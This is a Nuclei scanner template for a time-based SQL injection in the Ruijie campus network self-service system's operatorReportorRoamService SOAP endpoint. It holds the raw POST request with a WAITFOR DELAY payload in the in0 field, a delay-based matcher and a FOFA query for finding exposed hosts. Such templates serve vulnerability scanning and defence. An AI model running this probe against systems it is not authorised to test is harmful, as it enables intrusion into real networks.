MyNuclei/锐捷校园网自助服务系统-operatorReportorRoamService-SQL注入漏洞.yaml

id: RuijieXiaoyuanwangzizhufuwuxitong-operatorReportorRoamService-sqli

info:
  name: 锐捷校园网自助服务系统-operatorReportorRoamService-SQL注入漏洞
  author: candada
  severity: high
  description: 'SQL注入被广泛用于非法入侵网站服务器，获取网站控制权。它是应用层上的一种安全漏洞。通常在设计存在缺陷的程序中，对用户输入的数据没有做好过滤，导致恶意用户可以构造一些SQL语句让服务器去执行，从而导致数据库中的数据被窃取，篡改，删除，以及进一步导致服务器被入侵等危害。'
  reference:
    - https://
  tags: 2024,锐捷,sqli
  metadata:
    fofa-query: title=="校园网自助服务系统"
  classification:
    cvss-metrics: 
    cvss-score:                                                   
    cve-id:                                              
    cwe-id:                                                    
    epss-score:                                              
    epss-percentile:                                           
    cpe: 
http:
  - raw:
      - |
        POST /selfservice/service/operatorReportorRoamService HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Upgrade-Insecure-Requests: 1
        Connection: close
        Content-Type: text/xml;charset=UTF-8
        Content-Length: 357

        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ser="http://service.webservice.common.spl.ruijie.com">
        <soapenv:Header/>
            <soapenv:Body>
            <ser:queryOperatorUuid>
              <!--type: string-->
              <ser:in0>';WAITFOR DELAY '0:0:5'--</ser:in0>
            </ser:queryOperatorUuid>
            </soapenv:Body>
        </soapenv:Envelope>


    matchers:
      - type: dsl
        dsl:
          - "status_code == 200 && duration>=5 && duration<=6"